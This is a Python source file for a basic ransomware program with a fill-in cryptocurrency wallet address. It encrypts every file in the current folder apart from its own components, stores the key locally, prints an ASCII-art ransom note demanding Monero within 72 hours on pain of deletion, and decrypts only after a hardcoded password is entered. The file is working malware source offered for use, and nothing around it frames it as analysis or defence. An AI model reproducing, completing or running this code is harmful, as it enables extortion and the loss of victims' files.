import time
import os.path


#Specify your details
ransom = 1000
currency = "Monero"
address = "YOUR ADDRESS HERE"

#Code to find and encrypt in the local folder
def encrypt():
    #! /usr/bin/env python3
    import os
    from cryptography.fernet import Fernet
    #file finder
    files = []
    for file in os.listdir():
        if file == "ultimateransom.exe" or file == "ultimateransom.py" or file == "decryptFile.exe" or file == "encryptFile.exe" or file == "ransomeware.py" or file == "decrypt.py" or file == "test.py" or file == "ransomeware.exe" or file == "decrypt.exe" or file == "ransomewaremaker.py" or file == "encryptFile.py" or file == "decryptFile.py" or file == "thekey.key" or file == "virus.exe" or file == "virusDecrypter.exe":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    print("__   __                  __ _ _             _                       _                                                        _           _ ")
    print("\ \ / /                 / _(_) |           | |                     | |                                                      | |         | |")
    print(" \ V /___  _   _ _ __  | |_ _| | ___  ___  | |__   __ ___   _____  | |__   ___  ___ _ __     ___ _ __   ___ _ __ _   _ _ __ | |_ ___  __| |")
    print("  \ // _ \| | | | '__| |  _| | |/ _ \/ __| | '_ \ / _` \ \ / / _ \ | '_ \ / _ \/ _ \ '_ \   / _ \ '_ \ / __| '__| | | | '_ \| __/ _ \/ _` |")
    print("  | | (_) | |_| | |    | | | | |  __/\__ \ | | | | (_| |\ V /  __/ | |_) |  __/  __/ | | | |  __/ | | | (__| |  | |_| | |_) | ||  __/ (_| |")
    print("  \_/\___/ \__,_|_|    |_| |_|_|\___||___/ |_| |_|\__,_| \_/ \___| |_.__/ \___|\___|_| |_|  \___|_| |_|\___|_|   \__, | .__/ \__\___|\__,_|")
    print("                                                                                                                  __/ | |                  ")
    print("                                                                                                                 |___/|_|                  ")
    print("To recover your files send ",ransom,"$ worth of",currency," to the address provided during the payment procedure. If this is not done within 72 hours all your files will be DELETED.")
    
#Deals with payment(not really) and decryption
def pay():
    print("Thanks for cooperating. Loading payment details...")
    time.sleep(1)
    print("(          ) 0%")
    time.sleep(0.5)
    print("(=         ) 10%")
    time.sleep(0.5)
    print("(==        ) 20%")
    time.sleep(0.5)
    print("(===       ) 30%")
    time.sleep(0.5)
    print("(====      ) 40%")
    time.sleep(0.5)
    print("(=====     ) 50%")
    time.sleep(0.5)
    print("(======    ) 60%")
    time.sleep(0.5)
    print("(=======   ) 70%")
    time.sleep(0.5)
    print("(========  ) 80%")
    time.sleep(0.5)
    print("(========= ) 90%")
    time.sleep(0.5)
    print("(==========) 99%")
    time.sleep(2)
    print("(==========) 100%")
    time.sleep(0.5)
    print("Payment details loaded")
    print("Please send ",ransom,"$ worth of ",currency," to this address:\n\n",address)
    print("\n\nOnce payment has been confirmed you will recive your decryption key.\n\n")

    #decryption
    #! /usr/bin/env python3
    import os
    from cryptography.fernet import Fernet
    #file finder
    files = []
    for file in os.listdir():
        if file == "ultimateransom.exe" or file == "ultimateransom.py" or file == "decryptFile.exe" or file == "encryptFile.exe" or file == "ransomeware.py" or file == "decrypt.py" or file == "test.py" or file == "ransomeware.exe" or file == "decrypt.exe" or file == "ransomewaremaker.py" or file == "encryptFile.py" or file == "decryptFile.py" or file == "thekey.key" or file == "virus.exe" or file == "virusDecrypter.exe":
            continue
        if os.path.isfile(file):
            files.append(file)
    #saves key as secretkey
    with open("thekey.key", "rb") as key:
        secretkey = key.read()
    #password needed to unlock
    password = "hei"
    print("Input your decryption key ( Case sensitive )\n")
    user_phrase = input()
    if user_phrase == password:
        #decrypts files with secretkey
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("Congratulations! Your files have been decrypted")
        os.remove("thekey.key")
    else:
        print("Wrong password")
    
#doesnt work right now
def npay():
    print("Your lack of cooperation is not appreciated. The ransome has increased by 100$")


def payment():
    #checks if files are already encrypted
    if os.path.exists("thekey.key") == False:
        encrypt()
    #asks whether the victim wants to pay yet
    #if the answer is not yes or y it will repeat and increase the ransom
    answer = ["yes","y"]
    run = 1
    while run == 1:
        userInput = str.lower(input("Do you wish to pay now? Yes/No\n"))
        if userInput in answer and userInput == "yes" or userInput == "y":
            run = 0
            pay()   
        else:
            run = 1
            npay()
            time.sleep(3)

payment()